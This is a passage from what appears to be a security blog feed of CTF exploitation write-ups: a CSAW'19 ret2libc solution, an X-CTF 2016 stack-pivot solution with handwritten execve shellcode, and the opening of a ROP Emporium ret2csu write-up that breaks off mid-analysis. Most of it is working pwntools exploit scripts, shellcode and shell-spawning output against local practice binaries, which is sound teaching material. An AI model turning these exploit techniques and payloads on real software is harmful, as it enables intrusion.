<p>It also appears to prompt us for input. This is likely where we&rsquo;ll find a vulnerability we can exploit.</p>
<pre><code>$ ./baby_boi
Hello!
Here I am: 0x7f6b6221ecf0
asdfasdf
</code></pre><p>Reversing the <code>main</code> function reveals that the address leaked is indeed within <code>libc</code>, it points to <code>printf</code>. We&rsquo;ll keep this in mind for later.</p>
<pre><code>0x004006fc      488b05e50820.  mov rax, qword [reloc.printf] ; sym..got
0x00400703      4889c6         mov rsi, rax
0x00400706      488d3dae0000.  lea rdi, str.Here_I_am:__p_n ; 0x4007bb ; &quot;Here I am: %p\n&quot;
0x0040070d      b800000000     mov eax, 0
0x00400712      e879feffff     call sym..plt.got
</code></pre><p>Towards the end of the <code>main</code> function a call to <code>gets</code> is made. Wonderful, we&rsquo;ve found a buffer overflow vulnerability.</p>
<pre><code>0x00400717      488d45e0       lea rax, [s]
0x0040071b      4889c7         mov rdi, rax                ; char *s
0x0040071e      b800000000     mov eax, 0
0x00400723      e848feffff     call sym.imp.gets           ; char *gets(char *s)
0x00400728      b800000000     mov eax, 0
0x0040072d      c9             leave
0x0040072e      c3             ret
</code></pre><h2 id="information-gathering">Information Gathering</h2>
<p>First, let&rsquo;s find the offset of the return address from the input buffer <code>*s</code> where <code>gets</code> stores our user input.</p>
<p>This is a small script that attaches the process to GDB before sending a large cyclic pattern of bytes. We can use this to determine the return address' offset.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./baby_boi&#39;</span>)
gdb<span style="color:#f92672">.</span>attach(r)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(cyclic(<span style="color:#ae81ff">300</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>After continuing in GDB, and looking at the top of the stack we can see we&rsquo;ve overwritten the return address with our garbage data.</p>
<pre><code> ► 0x40072e &lt;main+167&gt;    ret    &lt;0x6161616161616166&gt;
</code></pre><p>Let&rsquo;s use pwntools' <code>cyclic_find</code> function to calculate the offset of the return address from the start of our input.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6161616161616166</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">40</span>
</code></pre></div><p>Now, let&rsquo;s do some investigation within GDB. Using the <code>info proc map</code> command we can see the start address where <code>libc</code> is loaded, we&rsquo;ll use this to calculate the offset of <code>printf</code> from the start of <code>libc</code>.</p>
<pre><code>pwndbg&gt; info proc map
process 1332
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x401000     0x1000        0x0 ./baby_boi
            0x600000           0x601000     0x1000        0x0 ./baby_boi
            0x601000           0x602000     0x1000     0x1000 ./baby_boi
      0x7ffff7def000     0x7ffff7e14000    0x25000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so

...

pwndbg&gt; p printf
$1 = {int (const char *, ...)} 0x7ffff7e45cf0 &lt;__printf&gt;
pwndbg&gt; p/x 0x7ffff7e45cf0 - 0x7ffff7def000
$4 = 0x56cf0
</code></pre><p>We can use a wonderful tool called <code>one_gadget</code> to get an address in our <code>libc</code> that will automatically give us a shell if we return to it (provided that the right conditions are met).</p>
<pre><code>$ one_gadget /usr/lib/x86_64-linux-gnu/libc-2.31.so                                                        130 ⨯
0xcbd1a execve(&quot;/bin/sh&quot;, r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xcbd1d execve(&quot;/bin/sh&quot;, r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xcbd20 execve(&quot;/bin/sh&quot;, rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
</code></pre><p>We&rsquo;ll use that first gadget, located at <code>0xcbd1a</code> in combination with our leaked <code>libc</code> address to get a shell.</p>
<p>Using <code>ropper</code> we can find a gadget that will allow us to setup the correct conditions for our magic gadget.</p>
<pre><code>ropper --file ./baby_boi --search 'pop r12'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r12

[INFO] File: ./baby_boi
0x000000000040078c: pop r12; pop r13; pop r14; pop r15; ret;
</code></pre><h2 id="exploit-development">Exploit Development</h2>
<p>Now it&rsquo;s time to develop our exploit. Here&rsquo;s an outline of the main steps we want to take:</p>
<ul>
<li>Capture the leaked <code>printf</code> address.</li>
<li>Calculate the start address of <code>libc</code> using the leak and the offset of <code>printf</code> we calculated earlier.</li>
<li>Overwrite the return address with the address of our setup gadget.</li>
<li>Return to <code>libc</code> and our magic gadget to get a shell.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>


<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">0x000000000040078c: pop r12; pop r13; pop r14; pop r15; ret;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
setup <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40078c</span>

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">0xcbd1a execve(&#34;/bin/sh&#34;, r12, r13)
</span><span style="color:#e6db74">constraints:
</span><span style="color:#e6db74">  [r12] == NULL || r12 == NULL
</span><span style="color:#e6db74">  [r13] == NULL || r13 == NULL
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
magic <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0cbd1a</span>


pad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">40</span>


elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./baby_boi&#39;</span>)
rop <span style="color:#f92672">=</span> ROP(elf)

rop<span style="color:#f92672">.</span>raw(setup)
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r12</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r13</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r14</span>
rop<span style="color:#f92672">.</span>raw(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># pop r15</span>


r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./baby_boi&#39;</span>)

r<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">&#39;Here I am: &#39;</span>)
libc <span style="color:#f92672">=</span> eval(r<span style="color:#f92672">.</span>readline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x56cf0</span>
rop<span style="color:#f92672">.</span>raw(libc <span style="color:#f92672">+</span> magic)

r<span style="color:#f92672">.</span>writeline(pad <span style="color:#f92672">+</span> rop<span style="color:#f92672">.</span>chain())
r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>And finally, here&rsquo;s the exploit in action.</p>
<pre><code>$ ./exploit.py 
[*] './baby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './baby_boi'
[+] Starting local process './baby_boi': pid 2253
[*] Switching to interactive mode
$ cat flag.txt
csaw19{babyboi}
$ 
[*] Stopped process './baby_boi' (pid 2253)
</code></pre>]]></content></item><item><title>X-CTF 2016 :: B0verflow</title><link>https://anvbis.github.io/posts/xctf-2016-b0verflow/</link><pubDate>Fri, 13 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/xctf-2016-b0verflow/</guid><description>Reverse Engineering Let&amp;rsquo;s begin by using the file command to get a little insight into this executable. Note that it is a 32-bit linux binary.
$ file ./b0verflow ./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped We can also use checksec to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>Let&rsquo;s begin by using the <code>file</code> command to get a little insight into this executable. Note that it is a 32-bit linux binary.</p>
<pre><code>$ file ./b0verflow 
./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
</code></pre><p>We can also use <code>checksec</code> to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow.</p>
<pre><code>$ checksec ./b0verflow
[*] './b0verflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
</code></pre><p>Running the binary reveals that it at some point prompts us for user input. This is likely where we&rsquo;ll find a vulnerability (perhaps it reads to much data in).</p>
<pre><code>$ ./b0verflow 

======================

Welcome to X-CTF 2016!

======================
What's your name?
anvbis
Hello anvbis
.
</code></pre><p>Disassembling the <code>main</code> function reveals that it calls a function <code>vul</code>. We&rsquo;ll want to investigate this function next, I get the feeling it&rsquo;s vulnerable.</p>
<pre><code>int main (int argc, char **argv, char **envp);
0x0804850e      push    ebp
0x0804850f      mov     ebp, esp
0x08048511      and     esp, 0xfffffff0
0x08048514      call    vul        ; sym.vul
0x08048519      leave
0x0804851a      ret
</code></pre><p>Reversing the <code>vul</code> function shows that it reads in 0x32 bytes from stdin, and stores them at a pointer <code>*s</code>. However, we can see that no memory (beyond the size of the pointer itself) is allocated on the stack at this address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">undefined4 <span style="color:#a6e22e">vul</span>(<span style="color:#66d9ef">void</span>)
{
    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s;
    
    puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">======================&#34;</span>);
    puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Welcome to X-CTF 2016!&#34;</span>);
    puts(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">======================&#34;</span>);
    puts(<span style="color:#e6db74">&#34;What</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">s your name?&#34;</span>);
    fflush(_reloc.stdout);
    fgets(<span style="color:#f92672">&amp;</span>s, <span style="color:#ae81ff">0x32</span>, _reloc.stdin);
    printf(<span style="color:#e6db74">&#34;Hello %s.&#34;</span>, <span style="color:#f92672">&amp;</span>s);
    fflush(_reloc.stdout);
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
}
</code></pre></div><p>We&rsquo;ve found our stack buffer overflow.</p>
<h2 id="information-gathering">Information Gathering</h2>
<p>Next, let&rsquo;s find where the return address is relative to our input buffer. Note that the <code>vul</code> function doesn&rsquo;t read many bytes in (only 0x32) so hopefully this is enough to reach the return address.</p>
<p>Here&rsquo;s a simple script that attaches the process to GDB and sends a cyclic pattern of 100 bytes that we can use to determine the return address' offset.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./b0verflow&#39;</span>)
gdb<span style="color:#f92672">.</span>attach(r)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(cyclic(<span style="color:#ae81ff">100</span>))

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>We can continue in GDB and watch the process crash when it tries to return to our garbage data. See the top of the stack below, it seems we can only write about 9 bytes past the return address, this will complicate our exploit.</p>
<pre><code>pwndbg&gt; x/4x $esp
0xff93cf20:     0x6161616b      0x6161616c      0x0000006d      0xf7de4e46
</code></pre><p>Let&rsquo;s print out the value of <code>$eip</code> and use pwntools' <code>cyclic_find</code> function to find the offset. It appears that <code>$eip</code> is 36 bytes after the start of our input buffer.</p>
<pre><code>pwndbg&gt; p $eip
$1 = (void (*)()) 0x6161616a
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6161616a</span>)
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">36</span>
</code></pre></div><p>So, now we need to solve the limited space issue (9 bytes is not enough space to store a complex ROP chain). Let&rsquo;s use the <code>ropper</code> tool to see if we can find any gadgets to pivot our stack.</p>
<pre><code>$ ropper --file ./b0verflow --stack-pivot
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x08048609: add esp, 0x1c; pop ebx; pop esi; pop edi; pop ebp; ret; 
0x0804837e: add esp, 8; pop ebx; ret; 
0x0804847e: ret 0xeac1; 
0x08048500: sub esp, 0x24; ret; 

4 gadgets found
</code></pre><p>The gadget that I immediately noticed was <code>sub esp, 0x24; ret</code>, this will allow us to move the stack almost all the way to the start of our input buffer (about 4 bytes into our input buffer, to be exact).</p>
<pre><code>0x08048500: sub esp, 0x24; ret;
</code></pre><p>Now we just need something like a <code>jmp esp</code> or a <code>mov eax, esp; jmp eax</code> gadget to direct process execution to our shellcode. Using <code>ropper</code> again, we immediately find a <code>jmp esp</code> instruction.</p>
<pre><code>$ ropper --file ./b0verflow --search 'jmp esp'                                                              130 ⨯
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp esp

[INFO] File: ./b0verflow
0x08048504: jmp esp;
</code></pre><h2 id="exploit-development">Exploit Development</h2>
<p>Now that we have all the information we need, we can start developing our exploit.</p>
<p>Let&rsquo;s write some shellcode. We only have a limited amount of space to store it (about 32 bytes), so I&rsquo;ve used various techniques (such as using <code>xor</code> to set registers to <code>0</code>) to reduce the size of the shellcode.</p>
<pre><code>.global _start

_start:
.intel_syntax noprefix
shell:
    push 0x0068732f     # &quot;/sh&quot;
    push 0x6e69622f     # &quot;/bin&quot;
    mov ebx, esp        # &quot;/bin/sh&quot;
    xor ecx, ecx
    xor edx, edx
    mov al, 11
    int 0x80            # execve(&quot;/bin/sh&quot;)
</code></pre><pre><code>$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
</code></pre><p>After compilation, we can see that our shellcode is only 20 bytes long, very nice.</p>
<pre><code>08049000 &lt;_start&gt;:
 8049000:       68 2f 73 68 00          push   $0x68732f
 8049005:       68 2f 62 69 6e          push   $0x6e69622f
 804900a:       89 e3                   mov    %esp,%ebx
 804900c:       31 c9                   xor    %ecx,%ecx
 804900e:       31 d2                   xor    %edx,%edx
 8049010:       b0 0b                   mov    $0xb,%al
 8049012:       cd 80                   int    $0x80
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">1</span>]: open(<span style="color:#e6db74">&#39;payload&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
Out[<span style="color:#ae81ff">1</span>]: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;h/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">h/bin</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xc9</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xd2\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#39;</span>

In [<span style="color:#ae81ff">2</span>]: len(open(<span style="color:#e6db74">&#39;payload&#39;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read())
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">20</span>
</code></pre></div><p>Now we can write our final exploit. Note that we need to add the address to the <code>jmp esp</code> gadget 4 bytes after the start of our input buffer (as this is where the program will attempt to get the next return address after our stack pivot).</p>
<p>Here&rsquo;s an overview of what we want to achieve:</p>
<ul>
<li>Pivot our stack with the <code>sub esp, 0x24; ret</code> gadget.</li>
<li>Jump to <code>$esp</code>, where our shellcode is stored.</li>
<li>Get shellcode execution.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>


<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">0x08048504: jmp esp;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
jmp_esp <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048504</span>)

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">0x08048500: sub esp, 0x24; ret;
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
sub_esp <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x08048500</span>)


buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;h/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">h/bin</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xc9</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xd2\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#39;</span>

lpad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>
rpad <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">36</span> <span style="color:#f92672">-</span> len(buf) <span style="color:#f92672">-</span> len(jmp_esp) <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>)

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./b0verflow&#39;</span>)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(lpad <span style="color:#f92672">+</span> jmp_esp <span style="color:#f92672">+</span> buf <span style="color:#f92672">+</span> rpad <span style="color:#f92672">+</span> sub_esp)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>And finally, here&rsquo;s our exploit in action.</p>
<pre><code>$ ./exploit.py 
[+] Starting local process './b0verflow': pid 2328
[*] Switching to interactive mode
$ cat flag.txt
X-CTF{b0verflow}
$ 
[*] Stopped process './b0verflow' (pid 2328)
</code></pre>]]></content></item><item><title>ROP Emporium :: Ret2csu</title><link>https://anvbis.github.io/posts/rop-emporium-ret2csu/</link><pubDate>Thu, 12 Aug 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/rop-emporium-ret2csu/</guid><description>Reverse Engineering Let&amp;rsquo;s run the file command to get a brief overview of the binary. Note that it is a 64-bit linux executable.
$ file ./ret2csu ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped We can also run checksec against the target. This reveals a little more information, we can see that there is no stack canary, so there&amp;rsquo;s no need to bypass that protection.</description><content type="html"><![CDATA[<h2 id="reverse-engineering">Reverse Engineering</h2>
<p>Let&rsquo;s run the <code>file</code> command to get a brief overview of the binary. Note that it is a 64-bit linux executable.</p>
<pre><code>$ file ./ret2csu
ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
</code></pre><p>We can also run <code>checksec</code> against the target. This reveals a little more information, we can see that there is no stack canary, so there&rsquo;s no need to bypass that protection. We can also see that the NX bit is enabled, so we can&rsquo;t execute shellcode.</p>
<pre><code>$ checksec ./ret2csu
[*] './ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
</code></pre><p>Running the executable shows us that it at some point takes user input. This is likely where we&rsquo;ll be able to find some vulnerability.</p>
<pre><code>$ ./ret2csu                   
ret2csu by ROP Emporium
x86_64

Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

&gt; hello
Thank you!
</code></pre><p>After a tiny bit of reverse engineering, we see this <code>pwnme</code> function called by <code>main</code>. We can see that it allocates 0x20 bytes of memory for a buffer <code>buf</code>, before reading in 0x200 bytes from stdin and storing it in the buffer - here is our overflow.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pwnme</span>(<span style="color:#66d9ef">void</span>)
{
    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf;
    
    setvbuf(<span style="color:#f92672">*</span>_reloc.stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
    puts(<span style="color:#ae81ff">0xc88</span>);
    puts(<span style="color:#ae81ff">0xca0</span>);
    memset(<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x20</span>);
    puts(<span style="color:#ae81ff">0xca8</span>);
    printf(<span style="color:#ae81ff">0xd12</span>);
    read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0x200</span>);
    puts(<span style="color:#ae81ff">0xd15</span>);
    <span style="color:#66d9ef">return</span>;
}
</code></pre></div><p>Further investigation reveals that there is a function called <code>ret2win</code>. Another function <code>usefulFunction</code> appears to call <code>ret2win</code> with the parameters <code>ret2win(0x3, 0x2, 0x1)</code>. We&rsquo;ll want to investigate this function further.</p>
<pre><code>0x00400510    1 6            sym.imp.ret2win
</code></pre><pre><code>0x000000000040061b &lt;+4&gt;:     mov    edx,0x3
0x0000000000400620 &lt;+9&gt;:     mov    esi,0x2
0x0000000000400625 &lt;+14&gt;:    mov    edi,0x1
0x000000000040062a &lt;+19&gt;:    call   0x400510 &lt;ret2win@plt&gt;
</code></pre><p>Reversing the <code>ret2win</code> function reveals that it will immediately call <code>exit</code> if the correct parameters are not provided. If the correct parameters are provided, however, the binary will decrypt and print the flag stored in <code>encrypted_flag.dat</code>.</p>
<p>The correct parameters are as follows:</p>
<ul>
<li><code>$rdi = 0xdeadbeefdeadbeef</code>.</li>
<li><code>$rsi = 0xcafebabecafebabe</code>.</li>
<li><code>$rdx = 0xd00df00dd00df00d</code>.</li>
</ul>
<p>So we have to find some way to set all of these registers to their correct values before calling the <code>ret2win</code> function in order to get the flag.</p>
<pre><code>      0x000009ef      48b8efbeadde.  movabs rax, 0xdeadbeefdeadbeef
      0x000009f9      483945e8       cmp qword [var_18h], rax
  ┌─&lt; 0x000009fd      0f85d7000000   jne 0xada
  │   0x00000a03      48b8bebafeca.  movabs rax, 0xcafebabecafebabe
  │   0x00000a0d      483945e0       cmp qword [var_20h], rax
 ┌──&lt; 0x00000a11      0f85c3000000   jne 0xada
 ││   0x00000a17      48b80df00dd0.  movabs rax, 0xd00df00dd00df00d
 ││   0x00000a21      483945d8       cmp qword [var_28h], rax
┌───&lt; 0x00000a25      0f85af000000   jne 0xada
│││   0x00000a2b      488d35ee0200.  lea rsi, [0x00000d20]
│││   0x00000a32      488d3de90200.  lea rdi, str.encrypted_flag.dat
│││   0x00000a39      e8f2fdffff     call sym.imp.fopen

...

│││
└└└─&gt; 0x00000ada      488d3d930200.  lea rdi, str.Incorrect_parameters
      0x00000ae1      e8bafcffff     call sym.imp.puts           ; int puts(const char *s)
      0x00000ae6      bf01000000     mov edi, 1                  ; int status
      0x00000aeb      e850fdffff     call sym.imp.exit           ; void exit(int status)
</code></pre><h2 id="information-gathering">Information Gathering</h2>
<p>First, let&rsquo;s find the offset of the return address from where our input buffer is stored in the <code>pwnme</code> function.</p>
<p>We&rsquo;ll use a small script to attach the process to GDB and store a cyclic pattern of bytes in our input buffer. This will allow us to calculate the offset from the start of our input buffer to the return address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python3</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2csu&#39;</span>)
gdb<span style="color:#f92672">.</span>attach(r)

r<span style="color:#f92672">.</span>clean()
r<span style="color:#f92672">.</span>writeline(cyclic(<span style="color:#ae81ff">200</span>))

r<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>We can continue within GDB, and print the value at the top of the stack to get the value stored in the return pointer.</p>
<pre><code>pwndbg&gt; x/gx $rsp
0x7ffe9d7c4538: 0x6161616161616166
</code></pre><p>Using pwntools' <code>cyclic_find</code> function we can get the offset from the start of our input buffer to the return address stored on the stack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">In [<span style="color:#ae81ff">2</span>]: cyclic_find(<span style="color:#ae81ff">0x6161616161616166</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
Out[<span style="color:#ae81ff">2</span>]: <span style="color:#ae81ff">40</span>
</code></pre></div><p>Next let&rsquo;s figure out how we can store a value in the <code>$rdx</code> register. We&rsquo;re able to store values in the <code>$rdi</code> and <code>$rsi</code> registers quite easily (they have <code>pop; ret</code> gadgets we can easily use).</p>
<p>After digging around the <code>__libc_csu_init</code> function, we find two interesting looking gadgets, see below (I&rsquo;ve added some comments for clarity).</p>
<p>Note that we can use the first gadget to set the values of <code>$rsi</code> and <code>$rdx</code>.</p>
<pre><code>0x00400680      4c89fa         mov rdx, r15
0x00400683      4c89f6         mov rsi, r14
0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
0x00400691      4839dd         cmp rbp, rbx
0x00400694      75ea           jne 0x400680
</code></pre><pre><code>0x0040069a      5b             pop rbx ; set to 0
0x0040069b      5d             pop rbp ; set to 1 to bypass check after call
0x0040069c      415c           pop r12 ; set to pointer to useless function
0x0040069e      415d           pop r13
0x004006a0      415e           pop r14 ; set to 0xcafebabecafebabe to store in $rsi
0x004006a2      415f           pop r15 ; set to 0xd00df00dd00df00d to store in $rdx
0x004006a4      c3             ret
</code></pre><p>It&rsquo;ll be a little complex, but we should be able to use these to get the values we want into our target registers.</p>
<p>We can use the second gadget to set up for the first gadget (so we can move the correct values into our target registers).</p>
<p>Note the <code>call qword [r12 + rbx*8]</code> instruction. As it dereferences a pointer to a function, we can&rsquo;t use this to redirect execution.</p>
<pre><code>0x00400686      4489ef         mov edi, r13d 
0x00400689      41ff14dc       call qword [r12 + rbx*8]
0x0040068d      4883c301       add rbx, 1
</code></pre><p>Instead we&rsquo;ll have to find a pointer to some function that doesn&rsquo;t change anything, as to not ruin the values stored in our target registers. We&rsquo;ll just pass by this call and head to the <code>ret</code> instruction below.</p>
<p>Let&rsquo;s take a look at the functions stored in the binary, and see if we can find any pointers to them.</p>
<pre><code>pwndbg&gt; info functions
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  ret2win@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
